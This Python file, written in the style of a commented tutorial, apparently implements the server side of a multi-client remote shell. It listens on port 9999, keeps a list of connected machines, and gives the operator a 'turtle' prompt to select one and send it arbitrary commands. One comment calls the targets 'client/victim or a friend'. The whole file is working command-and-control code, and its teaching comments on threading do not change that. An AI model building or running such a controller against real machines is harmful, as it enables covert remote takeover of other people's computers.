import socket
import sys
import threading
import time
from queue import Queue

# In order for a programme to do two things simulatenously we require 'threading'.
# In this code, threading enables us to:
# 1) handle connections from multiple clients on one thread and 2) send commands to a connected client on a second.

# The threading process involves:
# 1) Making the number of threads you require, (create_threads function)
# 2) Deciding how many jobs need doing and then putting these jobs numbers in a job queue (create_job_queue function)
# Note: Threading requires jobs to be in a queue rather than a list
# 3) Assigning each job number in the queue a task.  For example:
# TASK 1 is handling connections- ie. creating/binding socket and accepting connections
# TASK 2 is running our turtle shell, which enables us to: select which computer to connect to and then send commands.

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closes previous connections every time multipleclientserver.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents the connection from timing out, if we don't do anything with it

            all_connections.append(conn) # stores all new connections in a list called all_connections
            all_address.append(address) # stores all ip addresses and port numbers in a list

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir

# Note: "TURTLE" IS JUST THE NAME FOR OUR INTERACTIVE SHELL, (A SHELL IS JUST SOMETHING LIKE TERMINAL OR COMMANDPROMPT)
def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections() # if command = "list" then list all active connections, as defined by list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd) #makes a connection to the target computer defined by the "get_target" function.

            if conn is not None:
                # once connectection is established- use the "send_target_commands" function to send commands remotely.
                send_target_commands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections(): #checks the "all_connections" list for "active" connections, and then prints these out.
    results = ''

    for i, conn in enumerate(all_connections): #checks if connection is still active by:
        try:
            conn.send(str.encode(' ')) # sending data to each device stored in the all_connections list
            conn.recv(20480) # and then if no data is receieved back, it deletes this connection from the list
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)




#selects the target to connect to by:
def get_target(cmd):
    # creating a new variable called "target" and setting this variable = an integar, based on the our turtle cmd input
    # e.g if our turtle command imput was: "select 1", then "target" = 1;
    # if our turtle cmd imput was equal to "select 4", then "target" = 4
    # Use our target variable and all_connections list to then make (return) a connection to that computer/device
    # ie. If command was "select 3", target = 3, so connect to the third computer in the all_connections list
    # print 2 messages to show we have connected to that computer
    # otherwise, print error message
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break # breaks the send_target_commands loop and returns us to the turtle shell
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create threads
def create_threads():
    # creates 2 threads (because NUMBER_OF_THREADS = 2) and them assigns then to a variable called "t",
    # It also assigns each thread a task as defined by the task() function
    # Then it starts both threads
    # Note: t.daemon = True tells threads to stop running whenever the server.py file stops running

    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=task)
        t.daemon = True
        t.start()


# creates tasks
def task():
    # Get item/jobs from the queue (defined by our create_job_queue function) and assigns them each a Tasks [1, 2]
    # If job/item 'x' in queue = 1,  then perform TASK 1 (create/bind sockets and accept connections)
    # If job/item 'x' in the queue = 2, then perform TASK 2 (start interactive turtle shell)
    # Note 1: Once each thread is started in the create_threads() function, each task will start automatically
    # Note 2: Because threads can run simultaneously, so can tasks
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_job_queue(): # Creates a queue which contains 'x' number of jobs to be completed
    # where x is defined by the JOB_NUMBER list = [1, 2]
    # So in this example: we create a queue of 2 jobs, where each job is later assigned a task by the "task() function"

    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_threads()
create_job_queue()